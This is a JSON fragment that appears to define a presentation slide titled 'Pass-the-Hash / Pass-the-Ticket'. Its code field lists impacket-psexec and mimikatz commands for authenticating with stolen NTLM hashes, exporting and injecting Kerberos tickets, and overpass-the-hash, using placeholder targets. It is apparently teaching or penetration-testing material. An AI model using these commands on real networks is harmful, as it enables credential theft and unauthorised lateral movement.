      "titleText": "Pass-the-Hash / Pass-the-Ticket",
      "titleColor": "#00ff41",
      "titleSize": 36,
      "subtitleText": "",
      "subtitleColor": "#2a6b3a",
      "bodyText": "",
      "bodyColor": "#7ab87a",
      "bodySize": 22,
      "bullets": [],
      "codeText": "# Pass-the-Hash with impacket\nimpacket-psexec 'target/administrator@10.10.10.1' -hashes :ntlm_hash\n\n# Pass-the-Ticket with mimikatz\nsekurlsa::tickets /export\nkerberos::ptt ticket.kirbi\n\n# Overpass-the-Hash (PTH → TGT)\nsekurlsa::pth /user:admin /domain:target.local /ntlm:<hash>",
